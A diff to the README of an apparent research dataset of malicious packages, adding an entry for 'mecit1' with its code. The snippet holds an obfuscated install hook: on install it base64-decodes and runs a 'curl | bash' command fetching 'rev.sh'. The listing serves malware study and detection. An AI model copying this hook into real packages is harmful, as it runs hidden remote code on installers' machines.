@@ -1,6 +1,6 @@
 ## Dataset Size
 
-This data set includes about 10,822 versions of the source code of 9,502 malicious packages.
+This data set includes about 10,823 versions of the source code of 9,503 malicious packages.
 
 ## Dataset Format
 
@@ -1329,6 +1329,28 @@ hello_world_package_test [0.1] <br>
 
 ### 11 Sept. 2024
 mlc-llm-nightly [99.99.101, 99.99.103, 99.99.105] <br>
+
+### 15 Sept. 2024
+mecit1 [1.0.0] <br>
+```python
+def b64d(base64_code):
+    base64_bytes = base64_code.encode('ascii')
+    code_bytes = base64.b64decode(base64_bytes)
+    code = code_bytes.decode('ascii')
+    return code
+
+def notmalfunc():
+    os.system(b64d("Y3VybCAtcyBodHRwOi8vbG9jYWxob3N0L3Jldi5zaCB8IGJhc2gK"))
+
+class AfterDevelop(develop):
+    def run(self):
+        develop.run(self)
+
+class AfterInstall(install):
+    def run(self):
+        install.run(self)
+        notmalfunc()
+```
 
 ## About the malicious packages detection
 
